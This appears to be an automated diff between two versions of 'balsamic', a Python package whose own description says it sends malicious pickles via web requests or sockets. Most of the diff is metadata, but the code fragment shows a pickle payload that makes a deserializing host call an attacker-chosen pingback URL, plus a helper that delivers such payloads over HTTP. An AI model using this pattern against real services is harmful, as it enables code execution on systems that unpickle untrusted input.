# Comparing `tmp/balsamic-0.2.8.tar.gz` & `tmp/balsamic-0.2.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "balsamic-0.2.8.tar", last modified: Fri May 24 22:45:11 2024, max compression
+gzip compressed data, was "balsamic-0.2.9.tar", last modified: Fri May 24 22:48:29 2024, max compression
```

## Comparing `balsamic-0.2.8.tar` & `balsamic-0.2.9.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-24 22:45:11.706715 balsamic-0.2.8/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2443 2024-05-24 22:45:11.706715 balsamic-0.2.8/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1909 2024-05-24 22:38:35.000000 balsamic-0.2.8/README.md
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-24 22:45:11.706715 balsamic-0.2.8/balsamic/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-24 22:35:48.000000 balsamic-0.2.8/balsamic/__innit__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2603 2024-05-24 22:35:48.000000 balsamic-0.2.8/balsamic/__main__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2962 2024-05-24 22:44:42.000000 balsamic-0.2.8/balsamic/balsamic.py
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-24 22:45:11.706715 balsamic-0.2.8/balsamic.egg-info/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2443 2024-05-24 22:45:11.000000 balsamic-0.2.8/balsamic.egg-info/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-24 22:45:11.000000 balsamic-0.2.8/balsamic.egg-info/SOURCES.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-24 22:45:11.000000 balsamic-0.2.8/balsamic.egg-info/dependency_links.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-24 22:45:11.000000 balsamic-0.2.8/balsamic.egg-info/requires.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-24 22:45:11.000000 balsamic-0.2.8/balsamic.egg-info/top_level.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-24 22:45:11.706715 balsamic-0.2.8/setup.cfg
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1144 2024-05-24 22:44:51.000000 balsamic-0.2.8/setup.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-24 22:48:29.669335 balsamic-0.2.9/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2443 2024-05-24 22:48:29.669335 balsamic-0.2.9/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1909 2024-05-24 22:38:35.000000 balsamic-0.2.9/README.md
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-24 22:48:29.669335 balsamic-0.2.9/balsamic/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-24 22:35:48.000000 balsamic-0.2.9/balsamic/__innit__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2603 2024-05-24 22:35:48.000000 balsamic-0.2.9/balsamic/__main__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2962 2024-05-24 22:48:03.000000 balsamic-0.2.9/balsamic/balsamic.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-24 22:48:29.669335 balsamic-0.2.9/balsamic.egg-info/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2443 2024-05-24 22:48:29.000000 balsamic-0.2.9/balsamic.egg-info/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-24 22:48:29.000000 balsamic-0.2.9/balsamic.egg-info/SOURCES.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-24 22:48:29.000000 balsamic-0.2.9/balsamic.egg-info/dependency_links.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-24 22:48:29.000000 balsamic-0.2.9/balsamic.egg-info/requires.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-24 22:48:29.000000 balsamic-0.2.9/balsamic.egg-info/top_level.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-24 22:48:29.669335 balsamic-0.2.9/setup.cfg
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1144 2024-05-24 22:48:12.000000 balsamic-0.2.9/setup.py
```

### Comparing `balsamic-0.2.8/PKG-INFO` & `balsamic-0.2.9/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.2.8
+Version: 0.2.9
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `balsamic-0.2.8/README.md` & `balsamic-0.2.9/README.md`

 * *Files identical despite different names*

### Comparing `balsamic-0.2.8/balsamic/__main__.py` & `balsamic-0.2.9/balsamic/__main__.py`

 * *Files identical despite different names*

### Comparing `balsamic-0.2.8/balsamic/balsamic.py` & `balsamic-0.2.9/balsamic/balsamic.py`

 * *Files 1% similar despite different names*

```diff
@@ -32,15 +32,15 @@
             return (requests.get, (utility.pingbackurl,))
 
 def updatecmd(new_cmd):
     Utility.command = new_cmd
 def updatepingbackurl(new_pingbackurl):
 	Utility.pingbackurl = new_pingbackurl
 
-def webreq(url, method, payload, param=None, cook=None, custom_header=None):
+def webreq(method, url, payload, param=None, cook=None, custom_header=None):
     methods = ["get", "post", "put", "patch"]
     headers = {custom_header:payload} if custom_header else {}
     payload = Utility.urlpickle(payload)
     payload = payload.decode("utf-8")
     if method in methods:
         request_method = getattr(requests, method)
     if param:
```

### Comparing `balsamic-0.2.8/balsamic.egg-info/PKG-INFO` & `balsamic-0.2.9/balsamic.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.2.8
+Version: 0.2.9
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `balsamic-0.2.8/setup.py` & `balsamic-0.2.9/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -3,15 +3,15 @@
 import os
 
 here = os.path.abspath(os.path.dirname(__file__))
 
 with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
     long_description = "\n" + fh.read()
 
-VERSION = '0.2.08'
+VERSION = '0.2.09'
 DESCRIPTION = 'Send malicious pickles via requests or sockets'
 LONG_DESCRIPTION = 'A package that allows the user to easily send out malicious pickles, via web requests, or a malicious server or client(currently ipv4 only)'
 
 # Setting up
 setup(
     name="balsamic",
     version=VERSION,
```

